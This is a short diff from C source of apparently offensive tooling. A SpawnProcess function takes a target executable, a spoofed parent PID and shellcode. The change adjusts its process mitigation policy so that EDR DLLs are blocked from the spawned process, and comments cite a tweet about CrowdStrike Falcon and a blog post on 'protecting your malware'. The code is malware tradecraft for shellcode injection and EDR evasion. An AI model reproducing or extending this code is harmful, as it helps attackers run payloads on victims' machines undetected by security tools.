@@ -85,8 +85,8 @@ void SpawnProcess(char * peName, DWORD ppid, unsigned char * shellcode, SIZE_T s
     // "Nope, Falcon loads perfectly fine with 'blockdlls' enabled and hooks ntdll. umppcXXXX.dll (Falcon's injected DLL) is digitally signed by MS so no wonder this doesn't prevents EDR injection pic.twitter.com/lDT4gOuYSV"
     //   — reenz0h (@Sektor7Net) October 25, 2019
     // https://blog.xpnsec.com/protecting-your-malware/
-    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON2 + PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON2;
-    //DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON2;
+    //DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON2 + PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON2;
+    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON2;
 
     // Get a handle to the target process
     HANDLE hProc = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)ppid);
